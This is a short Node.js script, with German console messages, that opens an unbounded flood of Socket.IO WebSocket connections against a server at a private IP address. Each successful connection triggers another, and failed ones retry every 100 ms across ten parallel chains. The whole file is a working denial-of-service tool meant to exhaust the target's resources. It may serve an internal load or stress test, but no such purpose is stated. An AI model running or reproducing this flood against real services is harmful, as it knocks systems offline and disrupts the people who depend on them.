const io = require('socket.io-client');
const SERVER_URL = 'http://10.62.144.174:4000';

let activeSockets = [];
let connectionAttempts = 0;

console.log(' WebSocket Connection Flood gestartet\n');

function createConnection() {
    const socket = io(SERVER_URL, {
        transports: ['websocket'],
        reconnection: true,
        timeout: 2000
    });

    connectionAttempts++;

    socket.on('connect', () => {
        activeSockets.push(socket);
        process.stdout.write(`\r Aktive Verbindungen: ${activeSockets.length} | Versuche: ${connectionAttempts}`);
        createConnection();
    });

    socket.on('connect_error', () => {
        setTimeout(createConnection, 100);
    });
}

// Starte 10 parallele Verbindungsströme
for (let i = 0; i < 10; i++) {
    createConnection();
}
